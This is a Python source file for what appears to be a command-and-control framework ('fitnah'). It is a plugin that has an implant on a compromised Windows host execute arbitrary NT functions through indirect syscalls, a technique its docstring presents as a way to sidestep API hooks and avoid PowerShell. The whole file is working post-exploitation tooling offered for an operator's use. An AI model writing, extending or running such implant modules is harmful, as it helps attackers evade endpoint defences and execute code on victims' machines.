"""execution/syscall_executor — direct NTAPI indirect syscall dispatch on agent. MITRE T1106

Uses the implant's IndirectSyscallInit() + ISysNt* wrappers (indirect_syscall.c)
to call NT functions with the return address inside ntdll — no API hook bypass needed,
no PowerShell inline C#. Operator specifies NT function name + args.
"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class SyscallExecutor(BasePlugin):
    NAME        = "syscall_executor"
    DESCRIPTION = "Execute an NT syscall on the implant using indirect syscall wrappers. No PowerShell."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1106"
    CATEGORY    = "execution"
    schema      = ParamSchema().add(
        Param("function",     str, required=True,
              help="NT function name, e.g. NtAllocateVirtualMemory"),
        Param("args_json",    str, required=False, default="{}",
              help="JSON args dict passed to the implant's syscall dispatcher"),
    )

    @mitre("T1106")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        r = ctx.send("syscall", {
            "function": params["function"],
            "args":     params.get("args_json", "{}"),
        })
        if r["status"] != "ok":
            return ModuleResult.err(f"syscall failed: {r['output']}")
        return ModuleResult.ok(data=r["output"])
